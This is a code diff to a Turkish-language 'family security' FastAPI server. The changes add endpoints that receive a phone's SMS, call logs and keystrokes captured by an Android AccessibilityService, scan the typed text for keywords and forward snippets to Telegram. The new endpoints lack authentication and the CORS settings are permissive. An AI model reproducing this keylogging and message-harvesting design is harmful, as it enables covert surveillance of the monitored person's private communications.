@@ -1,11 +1,12 @@
 from __future__ import annotations
 import os
+import time
 import asyncio
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
 from dotenv import load_dotenv
 import httpx
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, Request
 from fastapi.responses import HTMLResponse
 from fastapi.middleware.cors import CORSMiddleware
 
@@ -77,6 +78,9 @@ def _kr_del(apple_id: str) -> None:
         pass
 
 app = FastAPI(title="Aile Güvenliği Paneli")
+
+# Duplicate keystroke önleme: (profile_id, app_name) → (text, timestamp)
+_last_keystroke: dict = {}
 app.add_middleware(CORSMiddleware,
     allow_origins=["http://localhost:5173", "http://localhost:8000", "null", "app://.", "file://", "https://slides-east-euro-sounds.trycloudflare.com"],
     allow_origin_regex=r"https?://192\.168\.\d{1,3}\.\d{1,3}(:\d+)?",
@@ -115,6 +119,8 @@ db_service.init_db()
 
 _profiles: dict[str, Profile] = {}
 _push_tokens: dict[str, list[str]] = {}  # profile_id → [token, ...]
+_android_sms: dict[str, list] = {}   # profile_id → [{sender, text, timestamp, ...}]
+_android_calls: dict[str, list] = {} # profile_id → [{phone_number, duration, timestamp, direction}]
 
 CREDENTIALS_PATH = os.getenv("GMAIL_CREDENTIALS_PATH", "../credentials/gmail_oauth.json")
 TOKEN_DIR        = os.getenv("GMAIL_TOKEN_DIR", "../credentials")
@@ -724,30 +730,56 @@ async def get_flagged_apps(profile_id: str):
     return app_scanner.get_flagged(_get_apps(profile_id))
 
 
-# ── YENİ: SMS & Arama geçmişi ───────────────────────────────────────────────
+# ── SMS & Arama geçmişi ──────────────────────────────────────────────────────
+
+@app.post("/api/android-sms/{profile_id}")
+async def receive_android_sms(profile_id: str, request: Request):
+    """Android cihazdan SMS listesi al (ContentResolver)."""
+    body = await request.json()
+    items = body if isinstance(body, list) else []
+    _android_sms[profile_id] = items
+    return {"stored": len(items)}
+
+
+@app.post("/api/android-calls/{profile_id}")
+async def receive_android_calls(profile_id: str, request: Request):
+    """Android cihazdan arama geçmişi al (ContentResolver)."""
+    body = await request.json()
+    items = body if isinstance(body, list) else []
+    _android_calls[profile_id] = items
+    return {"stored": len(items)}
+
 
 @app.get("/api/sms/{profile_id}")
 async def get_sms(profile_id: str, limit: int = 200):
     _require_profile(profile_id)
-    if not local_backup_service.is_connected(profile_id):
-        raise HTTPException(status_code=400, detail="Yerel backup bağlantısı yok. Önce /api/auth/local-backup ile bağlanın.")
-    return local_backup_service.get_sms_messages(profile_id, limit=limit)
+    # Android verisi öncelikli
+    if profile_id in _android_sms:
+        return _android_sms[profile_id][:limit]
+    # iOS backup fallback
+    if local_backup_service.is_connected(profile_id):
+        return local_backup_service.get_sms_messages(profile_id, limit=limit)
+    return []
 
 
 @app.get("/api/sms/{profile_id}/flagged")
 async def get_flagged_sms(profile_id: str, limit: int = 200):
     _require_profile(profile_id)
     if not local_backup_service.is_connected(profile_id):
-        raise HTTPException(status_code=400, detail="Yerel backup bağlantısı yok.")
+        return []
     return local_backup_service.get_flagged_sms(profile_id, limit=limit)
 
 
 @app.get("/api/calls/{profile_id}")
 async def get_calls(profile_id: str, limit: int = 200):
     _require_profile(profile_id)
-    if not local_backup_service.is_connected(profile_id):
-        raise HTTPException(status_code=400, detail="Yerel backup bağlantısı yok. Önce /api/auth/local-backup ile bağlanın.")
-    return local_backup_service.get_call_records(profile_id, limit=limit)
+    # Android verisi öncelikli
+    if profile_id in _android_calls:
+        return _android_calls[profile_id][:limit]
+    # iOS backup fallback
+    if local_backup_service.is_connected(profile_id):
+        return local_backup_service.get_call_records(profile_id, limit=limit)
+    return []
 
 
 # ── İletişim Güvenlik Analizi ─────────────────────────────────────────────
@@ -794,6 +826,22 @@ async def analyze_sms(profile_id: str, limit: int = 200):
 async def get_suspicious_calls(profile_id: str, limit: int = 200):
     """Gece aramaları, bilinmeyen numaralar ve yoğun tekrar eden aramaları tespit eder."""
     _require_profile(profile_id)
+    # Android verisinden de analiz yap
+    if profile_id in _android_calls:
+        from datetime import datetime as _dt
+        calls_raw = _android_calls[profile_id][:limit]
+        night, freq_map = [], {}
+        for c in calls_raw:
+            ts_ms = c.get("timestamp", 0)
+            if ts_ms:
+                hour = _dt.fromtimestamp(ts_ms / 1000).hour
+                if hour >= 22 or hour < 7:
+                    night.append({"number": c.get("phone_number","?"), "direction": c.get("direction","?"), "duration": c.get("duration",0), "timestamp": ts_ms})
+            num = c.get("phone_number","")
+            if num:
+                freq_map[num] = freq_map.get(num, 0) + 1
+        frequent = [{"number": n, "count": cnt} for n, cnt in sorted(freq_map.items(), key=lambda x: -x[1]) if cnt >= 3]
+        return {"total": len(calls_raw), "night_calls": night, "frequent_unknown": frequent[:10]}
     if not local_backup_service.is_connected(profile_id):
         return {"total": 0, "night_calls": [], "frequent_unknown": []}
     calls = local_backup_service.get_call_records(profile_id, limit=limit)
@@ -1141,23 +1189,102 @@ async def post_android_keystroke(profile_id: str, body: dict):
     _require_profile(profile_id)
     app_name = body.get("app_name", "unknown")
     text = body.get("text", "")
+    is_risk_alert = bool(body.get("is_risk_alert", False))
+    risk_keyword = body.get("risk_keyword") or None
     if not text:
         return {"status": "skipped"}
-    db_service.save_keystroke(profile_id, app_name, text)
+
+    # Duplicate check: aynı uygulama + aynı metin + son 2 saniye içindeyse atla
+    dedup_key = (profile_id, app_name)
+    now = time.time()
+    last = _last_keystroke.get(dedup_key)
+    if last and last[0] == text and (now - last[1]) < 2.0:
+        return {"status": "duplicate"}
+    _last_keystroke[dedup_key] = (text, now)
+
+    db_service.save_keystroke(profile_id, app_name, text,
+                              is_risk_alert=is_risk_alert, risk_keyword=risk_keyword)
     keystroke_archiver.archive_keystroke(profile_id, app_name, text)
-    risk_level, _ = risk_engine.analyze_text(text)
-    if risk_level != "none":
-        desc = f"[{app_name}] Android riskli yazışma: {text[:40]}"
+
+    # Kelime takibi: kayıtlı keyword listesine karşı tara
+    kw_hits = keyword_service.scan_messages(
+        profile_id, [{"text": text, "sender": app_name}], source="keyboard"
+    )
+    for hit in kw_hits:
+        asyncio.create_task(
+            telegram_notifier.send_telegram_alert(
+                f"🔍 **Kelime Uyarısı:** '{hit['keyword']}' — [{app_name}] {text[:60]}"
+            )
+        )
+
+    if is_risk_alert or risk_keyword:
+        desc = f"[{app_name}] Riskli kelime: '{risk_keyword}' → {text[:40]}"
         risk_engine.record_event(
             profile_id=profile_id,
             event_type="Riskli Yazışma",
             description=desc,
-            score=40 if risk_level == "high" else 20,
+            score=50,
         )
         asyncio.create_task(
-            telegram_notifier.send_telegram_alert(f"⚠️ **Riskli Yazışma:** {desc}")
+            telegram_notifier.send_telegram_alert(f"🚨 **Klavye Uyarısı:** {desc}")
         )
+    else:
+        risk_level, _ = risk_engine.analyze_text(text)
+        if risk_level != "none":
+            desc = f"[{app_name}] Android riskli yazışma: {text[:40]}"
+            risk_engine.record_event(
+                profile_id=profile_id,
+                event_type="Riskli Yazışma",
+                description=desc,
+                score=40 if risk_level == "high" else 20,
+            )
+            asyncio.create_task(
+                telegram_notifier.send_telegram_alert(f"⚠️ **Riskli Yazışma:** {desc}")
+            )
     return {"status": "logged"}
+
+
+@app.post("/api/android-keystrokes-batch/{profile_id}")
+async def post_android_keystroke_batch(profile_id: str, body: dict):
+    """Android AccessibilityService toplu (batch) klavye verilerini kaydeder.
+    Body: {"entries": [{"app_name":..., "package":..., "text":..., "timestamp":..., "is_risk_alert":false}]}
+    """
+    _require_profile(profile_id)
+    entries = body.get("entries", [])
+    logged = 0
+    for entry in entries:
+        app_name = entry.get("app_name", "unknown")
+        text = entry.get("text", "")
+        if not text:
+            continue
+        db_service.save_keystroke(profile_id, app_name, text)
+        keystroke_archiver.archive_keystroke(profile_id, app_name, text)
+
+        # Kelime takibi
+        kw_hits = keyword_service.scan_messages(
+            profile_id, [{"text": text, "sender": app_name}], source="keyboard"
+        )
+        for hit in kw_hits:
+            asyncio.create_task(
+                telegram_notifier.send_telegram_alert(
+                    f"🔍 **Kelime Uyarısı:** '{hit['keyword']}' — [{app_name}] {text[:60]}"
+                )
+            )
+
+        risk_level, _ = risk_engine.analyze_text(text)
+        if risk_level != "none":
+            desc = f"[{app_name}] Android riskli yazışma: {text[:40]}"
+            risk_engine.record_event(
+                profile_id=profile_id,
+                event_type="Riskli Yazışma",
+                description=desc,
+                score=40 if risk_level == "high" else 20,
+            )
+            asyncio.create_task(
+                telegram_notifier.send_telegram_alert(f"⚠️ **Riskli Yazışma:** {desc}")
+            )
+        logged += 1
+    return {"status": "logged", "count": logged}
 
 
 @app.post("/api/keystrokes/{profile_id}")
